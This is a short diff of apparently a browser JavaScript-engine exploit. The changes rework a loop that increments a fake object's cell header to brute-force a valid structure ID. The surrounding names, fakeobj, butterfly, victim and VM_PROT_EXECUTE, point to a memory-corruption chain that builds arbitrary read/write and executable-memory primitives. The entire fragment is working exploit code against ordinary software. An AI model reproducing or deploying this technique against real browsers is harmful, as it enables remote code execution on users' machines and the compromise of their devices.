@@ -575,13 +575,14 @@ var VM_PROT_EXECUTE = 0x4
             log('got fakeobj with real struct id');
             //continue;
         } else {
-            while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
-            jsCellHeader.assignAdd(jsCellHeader, Int64.One);
-            container.header = header.asJSValue();
+            while (!(hax instanceof Array)) {
+            container.header.assignAdd(container.header, Int64.One);
+            //container.header = header.asJSValue();
             maxtry++;
             if (maxtry == 100000)
             {
               log("wow 10000 tries on getting valid structid failed!!!");
+            }
             }
         }
     // origButterfly is now based on the offset of **victim** 
